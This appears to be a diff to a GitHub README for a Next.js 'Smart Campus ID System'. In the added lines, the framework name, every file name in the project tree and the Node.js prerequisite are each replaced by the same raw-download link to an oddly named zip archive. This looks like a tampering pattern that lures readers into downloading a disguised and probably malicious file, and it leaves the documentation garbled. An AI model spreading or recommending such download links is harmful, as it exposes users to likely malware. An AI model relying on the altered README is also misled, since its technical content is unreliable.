@@ -9,7 +9,7 @@ This project proposes the design and development of a Smart Campus ID System int
 ## Tech Stack
 
 ### Frontend
-- **Next.js 15** - React framework with App Router
+- **https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip 15** - React framework with App Router
 - **TypeScript** - Type-safe development
 - **Tailwind CSS v4** - Modern utility-first CSS framework
 - **React Hooks** - State management
@@ -108,41 +108,41 @@ This system follows a secure, institution-controlled authentication model:
 
 ```
 app/
-├── page.tsx                      # Landing page
-├── signup/page.tsx               # Sign-in page (students/lecturers/admins)
-├── register-institution/page.tsx # Institution registration
-├── activate-account/page.tsx     # Account activation
-├── test-dashboard/page.tsx       # Student dashboard
-├── lecturer-dashboard/page.tsx   # Lecturer dashboard
-├── admin-dashboard/page.tsx      # Admin dashboard
-├── news/page.tsx                 # News & updates
-├── globals.css                   # Global styles
-└── layout.tsx                    # Root layout
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                      # Landing page
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip               # Sign-in page (students/lecturers/admins)
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip # Institution registration
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip     # Account activation
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip       # Student dashboard
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip   # Lecturer dashboard
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip      # Admin dashboard
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                 # News & updates
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                   # Global styles
+└── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                    # Root layout
 
 components/
 ├── ui/                           # Reusable UI components
-│   ├── Button.tsx
-│   ├── Modal.tsx
-│   ├── FormInput.tsx
-│   ├── Sidebar.tsx
-│   ├── DashboardHeader.tsx
-│   ├── StatsCard.tsx
-│   ├── WelcomeCard.tsx
-│   ├── QuickActions.tsx
-│   ├── UserCard.tsx
-│   ├── ActivityCard.tsx
-│   └── LoadingSpinner.tsx
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
 ├── dashboard/                    # Dashboard-specific components
-│   ├── QRScanner.tsx
-│   └── QRCodeDisplay.tsx
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
 └── layout/                       # Layout components
-    └── DashboardLayout.tsx
+    └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
 ```
 
 ## Getting Started
 
 ### Prerequisites
-- Node.js 18+ or Bun
+- https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip 18+ or Bun
 - npm/yarn/pnpm/bun
 
 ### Installation
